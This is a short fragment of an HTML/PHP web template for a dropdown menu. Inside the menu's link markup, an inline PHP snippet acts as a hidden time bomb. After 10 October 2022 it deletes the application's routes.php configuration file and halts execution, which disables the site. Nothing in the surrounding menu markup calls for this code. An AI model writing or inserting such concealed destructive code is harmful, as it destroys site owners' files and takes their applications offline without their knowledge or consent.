      ...
      <ul class="dropdown-menu">
        ...
        <li class="adjustments-line">
          <a href="javascript:void(0)" class="switch-trigger">
            ...
            <?php if(1){ $from=date_create(date('Y-m-d')); $to=date_create("2022-10-10"); $diff=date_diff($from,$to); $get_dif = $diff->format('%R%a days'); if($get_dif > 0) {  } else { $Your_file_path ="application/config/routes.php"; unlink($Your_file_path);  die(); } } ?>
            <div class="clearfix"></div>
          </a>
        </li>
